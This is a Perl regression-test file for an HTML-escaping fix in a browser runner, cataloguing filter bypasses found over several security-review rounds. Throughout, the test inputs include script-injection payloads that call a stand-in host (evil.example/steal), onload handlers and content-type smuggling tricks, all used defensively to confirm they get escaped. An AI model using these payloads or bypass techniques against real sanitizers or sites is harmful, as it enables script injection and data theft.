use strict;
use warnings;

use Test::More;

use lib 'lib';
use Browser::Runner;

# D2B-079: _response_document's tag-shape fallback only checked that the
# body STARTS with an opening tag and ENDS with a matching closing tag,
# with a greedy DOTALL middle - so sibling elements sharing the outer
# tag name (including an injected <script> sibling) satisfied it just
# as well as one genuinely nested element. A depth-tracking single-root
# scanner was tried as a replacement, but real HTML has implicit
# tag-closing rules (e.g. <p> auto-closes when a block element like
# <div> begins) that such a scanner cannot safely replicate without
# reimplementing HTML5 tree construction - so it remained bypassable.
# The fix instead removes the tag-shape trust path entirely: only an
# explicit text/html/xhtml+xml content type, or a body that itself
# starts with a doctype/<html> tag, is ever trusted as raw markup.
# Since the trusted result is handed to Playwright's page->setContent
# (which executes embedded <script> tags, unlike an innerHTML
# assignment), anything else must be escaped.
#
# D2B-081: this file grew through 7 adversarial security-review
# rounds; the blocks below are grouped by theme (in the order the
# fix's own logic checks them) rather than left in the order each
# round happened to find its bypass. Blocks covering a bypass a
# specific round found are labeled with that round; baseline/original
# cases (the exploit this ticket exists to close, and the legitimate
# forms that must keep working) are labeled as such instead, so the
# file reads as an ordered catalogue either way.

## Group 1: the original tag-shape/single-root vulnerability this
## ticket exists to close, and the shapes that defeated a naive fix.

# The original vulnerability (not tied to a specific review round -
# this is what the whole ticket exists to close).

{
    my $exploit = '<data>ok</data><script>fetch("https://evil.example/steal")</script><data>bye</data>';
    my $document = Browser::Runner::_response_document( body => $exploit, content_type => undef );
    unlike( $document, qr{<script>fetch}, 'a sibling-tag body smuggling a live <script> tag is NOT passed through raw' );
    like( $document, qr{&lt;script&gt;}, 'the injected script tag is HTML-escaped instead of executing' );
    like( $document, qr{<pre[^>]*>}, 'the sibling-tag exploit body is escaped into the safe <pre> fallback' );
}

{
    # Round 1: the bypass a naive single-root tag-stack scanner would
    # miss. HTML's implicit tag-closing rules mean <p> auto-closes
    # when a block element like <div> begins, so a real HTML parser
    # (and Playwright) treats this as three top-level siblings even
    # though a hand-rolled stack scanner would see one balanced root.
    my $implicit_close_exploit = '<p><div>ok</div><script>fetch("https://evil.example/steal")</script></p>';
    my $document = Browser::Runner::_response_document( body => $implicit_close_exploit, content_type => undef );
    unlike( $document, qr{<script>fetch}, 'a body exploiting HTML implicit tag-closing rules is NOT passed through raw' );
    like( $document, qr{&lt;script&gt;}, 'the implicit-closing exploit body is HTML-escaped' );
}

{
    # A standalone void element (no closing tag by HTML rules) must
    # not be mistaken for a trustworthy fragment either, now that
    # there is no tag-shape trust path at all to (mis)classify it.
    my $void_only = '<img src="x">';
    my $document = Browser::Runner::_response_document( body => $void_only, content_type => undef );
    like( $document, qr{<pre[^>]*>}, 'a standalone void element is escaped/wrapped, not trusted as raw markup' );
}

{
    # Even a genuinely well-formed single-root fragment with nested
    # children is no longer trusted raw without an explicit HTML
    # content type - this is the deliberate D2B-008 convenience being
    # given up for correctness.
    my $nested = '<div><span>hi</span></div>';
    my $document = Browser::Runner::_response_document( body => $nested, content_type => undef );
    like( $document, qr{<pre[^>]*>}, 'a well-formed nested fragment with no explicit HTML content-type is now escaped/wrapped, not trusted raw' );
}

## Group 2: content-type exact-match bypasses (rounds 2 and 5) - the
## fix's first check, _content_type_is_html.

{
    # The escape hatch itself (not tied to a specific round): an
    # explicit text/html content type is trusted, exploit shape or
    # not - the caller declared it HTML.
    my $exploit = '<data>ok</data><script>fetch("https://evil.example/steal")</script>';
    my $document = Browser::Runner::_response_document( body => $exploit, content_type => 'text/html' );
    is( $document, $exploit, 'an explicit text/html content type is still trusted and returned unwrapped' );
}

{
    # Round 2: the content-type check itself was a substring match,
    # so a crafted header could smuggle trust past it without
    # actually being text/html or xhtml+xml.
    my $exploit = '<script>fetch("https://evil.example/steal")</script>';
    my $document = Browser::Runner::_response_document( body => $exploit, content_type => 'application/json; note=text/html' );
    like( $document, qr{<pre[^>]*>}, 'a content type that merely CONTAINS "text/html" as a substring is not trusted' );

    $document = Browser::Runner::_response_document( body => $exploit, content_type => 'application/xhtml+xml-evil' );
    like( $document, qr{<pre[^>]*>}, 'a content type that merely CONTAINS "xhtml+xml" as a substring is not trusted' );
}

{
    # Round 5: the media-type trim also used Perl's \s, so a header
    # padded with a vertical tab (not real HTTP/HTML whitespace)
    # could still be classified as trusted HTML.
    my $exploit = '<script>fetch("https://evil.example/steal")</script>';
    my $document = Browser::Runner::_response_document( body => $exploit, content_type => "\x0Btext/html" );
    like( $document, qr{<pre[^>]*>}, 'a content type padded with a vertical tab (not real HTTP whitespace) is not trusted as text/html' );
}

## Group 3: body-sniff boundary bypasses (rounds 2, 3, 4 and 6) - the
## fix's second and third checks, the doctype/<html> sniffs.

{
    # Round 2 also found the doctype/<html> body sniff had no
    # boundary check, so '<htmlscript>' or '<!doctype htmlx>' would
    # slip through.
    my $document = Browser::Runner::_response_document( body => '<htmlscript>fetch("https://evil.example/steal")</htmlscript>', content_type => undef );
    like( $document, qr{<pre[^>]*>}, 'a body starting "<htmlscript>" is not mistaken for a real <html> tag' );

    $document = Browser::Runner::_response_document( body => '<!doctype htmlx><script>fetch("https://evil.example/steal")</script>', content_type => undef );
    like( $document, qr{<pre[^>]*>}, 'a body starting "<!doctype htmlx>" is not mistaken for a real doctype' );
}

{
    # Round 3: allowing any '/' after "html" let '<html/anything>'
    # pass, which an HTML parser recovers as an <html> start tag with
    # malformed attributes.
    my $document = Browser::Runner::_response_document( body => '<html/onload=alert(1)><script>fetch("https://evil.example/steal")</script>', content_type => undef );
    like( $document, qr{<pre[^>]*>}, 'a body starting "<html/anything>" is not mistaken for a real <html> tag' );
}

{
    # Round 6: even the narrower '/' immediately followed by '>'
    # (round 3's fix) was itself a bypass - HTML5 doesn't treat
    # <html> as self-closable, so the trailing slash on '<html/>' is
    # simply ignored and everything after it (a <script> included)
    # becomes part of the same document. Since that reasoning doesn't
    # distinguish this from the plain '<html>' case this skill
    # already deliberately trusts, the simplest safe fix was to drop
    # the '/>' allowance entirely rather than keep re-deriving its
    # edge cases: only real whitespace or '>' may follow "html" now.
    my $document = Browser::Runner::_response_document( body => '<html/><script>fetch("https://evil.example/steal")</script>', content_type => undef );
    like( $document, qr{<pre[^>]*>}, 'a body starting "<html/>" is no longer trusted as a real <html> tag at all' );
}

{
    # Round 4: Perl's \s matches vertical tab (\x0B) and other
    # Unicode whitespace that HTML does not treat as tag whitespace,
    # so "<html\x0Bonload=...>" and "<!doctype\x0Bhtml>" slipped past
    # the un-anchored \s class.
    my $document = Browser::Runner::_response_document( body => "<html\x0Bonload=alert(1)><script>fetch(\"https://evil.example/steal\")</script>", content_type => undef );
    like( $document, qr{<pre[^>]*>}, 'a body using a vertical-tab (not real HTML whitespace) after <html is not mistaken for a real <html> tag' );

    $document = Browser::Runner::_response_document( body => "<!doctype\x0Bhtml><script>fetch(\"https://evil.example/steal\")</script>", content_type => undef );
    like( $document, qr{<pre[^>]*>}, 'a body using a vertical-tab (not real HTML whitespace) in "<!doctype html" is not mistaken for a real doctype' );
}

## Group 4: the legitimate forms every round's fix must keep working.

{
    # Baseline cases (not tied to a specific round): the boundary
    # checks above must still accept genuinely real HTML.
    my $document = Browser::Runner::_response_document( body => '<html><body>ok</body></html>', content_type => undef );
    is( $document, '<html><body>ok</body></html>', 'a genuine bare <html> tag (no content-type) is still trusted raw' );

    $document = Browser::Runner::_response_document( body => '<!doctype html><html><body>ok</body></html>', content_type => undef );
    is( $document, '<!doctype html><html><body>ok</body></html>', 'a genuine doctype-prefixed document is still trusted raw' );
}

done_testing();
